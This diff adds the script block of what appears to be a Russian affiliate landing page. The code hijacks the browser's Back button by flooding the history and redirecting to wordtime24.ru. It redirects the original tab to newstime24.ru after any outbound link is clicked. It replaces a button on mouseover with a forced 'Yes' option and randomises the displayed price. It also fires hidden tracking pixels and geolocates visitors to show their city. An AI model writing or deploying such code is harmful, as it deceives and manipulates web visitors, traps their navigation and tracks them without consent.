@@ -1,0 +1,205 @@
+<!--scroll-->
+<script>
+  $(function() {
+    $("a[href^='#']").click(function() {
+      var _href = $(this).attr("href");
+      $("html, body").animate({
+        scrollTop: $(_href).offset().top + "px"
+      });
+      return false;
+    });
+  });
+
+</script>
+<!--scroll-->
+<!-- Start BackFix -->
+<script>
+  ! function() {
+    var t;
+    try {
+      const URL = window.location.href.split(/[#]/)[0];
+      for (t = 0; 10 > t; ++t) history.pushState({}, "", URL + '#rdm' + Math.floor(Math.random() * 10))
+      onpopstate = function(event) {
+        var b = document.createElement("img");
+        b.src = 'http://{domain}/click.php?event9=1';
+        event.state && location.replace('https://wordtime24.ru/tn?referral=3&stream=4079&utm_source=mdom' + window.location.search);
+      }
+    } catch (o) {
+      console.log(o);
+    }
+  }();
+
+</script>
+<!-- End BackFix -->
+<!--phone-->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/3.3.4/jquery.inputmask.bundle.min.js"></script>
+<script>
+  $(document).ready(function() {
+    $('input[name="phone"]').inputmask({
+      "mask": "+7(999)999-99-99"
+    });
+  });
+
+</script>
+<!--	phone-->
+
+<!-- Show showcase -->
+<script>
+  $('a[target="_blank"]').on('click',
+    function(e) {
+      e.preventDefault();
+      window.open($(this).attr('href'), '_blank');
+      setTimeout(function() {
+        window.location.href = 'https://newstime24.ru/tn/open?referral=3&stream=2475&utm_source=rudop'
+      }, 1000)
+    }
+  );
+
+</script>
+<!-- End Show showcase -->
+
+<!-- omnicpa API -->
+<style>
+  #created-button-x {
+    position: static;
+    cursor: pointer;
+    border: none;
+    background: #4B8DF8;
+    color: #FFF;
+    font-size: 22px;
+    padding: 3px 40px;
+    color: #FFF;
+    text-transform: uppercase;
+    line-height: 38px;
+    margin: 0 5px;
+    height: 38px;
+    vertical-align: top;
+    display: inline-block;
+    text-indent: 0;
+    text-align: center !important;
+    border-radius: 3px;
+  }
+
+  @media screen and (max-width: 600px) {
+    #created-button-x {
+      font-size: 18px !important;
+      padding: 3px 20px !important;
+      line-height: 28px !important;
+      height: 28px !important;
+    }
+  }
+
+</style>
+<script type="text/javascript" src="https://jsupcreate.com/js/api_v4/init.js?v=4"></script>
+<script>
+  const pricesArray = ['1496', '1996'];
+  let randomPrice = pricesArray[Math.floor(Math.random() * pricesArray.length)];
+
+  //		var referrer = document.referrer;
+  // var url_string = window.location.href;
+  // var parameter;
+  // if (referrer) {
+  // parameter = referrer;
+  // } else {
+  // parameter = url_string;
+  // }
+  // var url = new URL(parameter);
+  // var sid = url.searchParams.get("sid");
+  // console.log(sid);
+
+  $(document.body).on('mouseover', '#created-button-1', function() {
+    $('#created-button-1').replaceWith('<span id="created-button-x">Да</span>');
+  });
+
+  $(document.body).on('click', '#created-button-x', function(e) {
+    console.log('click');
+    window.open('thanks.html', '_blank');
+    setTimeout(function() {
+      window.location.href = 'https://newstime24.ru/tn/open?referral=3&stream=2475&utm_source=rudop'
+    }, 500);
+    e.preventDefault();
+  });
+  (function($) {
+    $(function() {
+      window.OmnicpaAPI = new window.OmnicpaAPIClass({
+        page: 'spacer',
+        click_id_name: '{clickid}',
+        params: {
+          traffic_flow_id: '4777',
+          pay_action: 'confirmed',
+          product_id: '104',
+          country: 'ru',
+          language: 'rus',
+          price: randomPrice,
+          // redirect: 'thanks.html',
+          // is_roulette: 1,
+          utm_source: 'pl',
+          utm_campaign: 'api',
+          utm_site: '{clickid}',
+          utm_content: '',
+          utm_term: '',
+          utm_medium: '',
+          special_price: '0'
+        }
+
+      });
+    });
+  })(window.OmnicpaAPIJq);
+
+</script>
+<!-- End omnicpa API -->
+<!-- Common scripts -->
+<script type="text/javascript">
+  var scroll = 0;
+  window.onscroll = function() {
+    if (scroll != 1) {
+      scroll = 1;
+      var o = document.createElement("img");
+      o.src = "https://{domain}/click.php?event6=1";
+    }
+  }
+
+</script>
+
+<script>
+  function pushToTrackerViaImage() {
+    var pushURL = 'https://{domain}/click.php?event7=1';
+    var img = document.createElement('img');
+    img.src = pushURL;
+    img.style.display = 'none';
+    document.body.appendChild(img);
+  }
+
+  function pushAfterTimeout(timeout) {
+    setTimeout(pushToTrackerViaImage, timeout * 1000);
+  }
+  var TIMEOUT_IN_SECONDS = 30;
+  pushAfterTimeout(TIMEOUT_IN_SECONDS);
+
+</script>
+
+<script>
+  if (typeof(window.orientation) == "undefined") {
+    var o = document.createElement("img");
+    o.src = 'https://{domain}/click.php?event8=0';
+  } else {
+    var o = document.createElement("img");
+    o.src = 'https://{domain}/click.php?event8=1';
+  }
+
+</script>
+
+<!-- End Common scripts -->
+<!--	geo-->
+<script src="https://api-maps.yandex.ru/2.0/?load=package.standard&lang=ru-RU" type="text/javascript"></script>
+<script type="text/javascript">
+  document.addEventListener("DOMContentLoaded", function() {
+    ymaps.ready(function() {
+      var e, n = ymaps.geolocation,
+        t = document.getElementsByClassName("user-city");
+      for (e = 0; e < t.length; e++) t[e].innerHTML = "" + n.city
+    })
+  });
+
+</script>
+<!--	geo-->
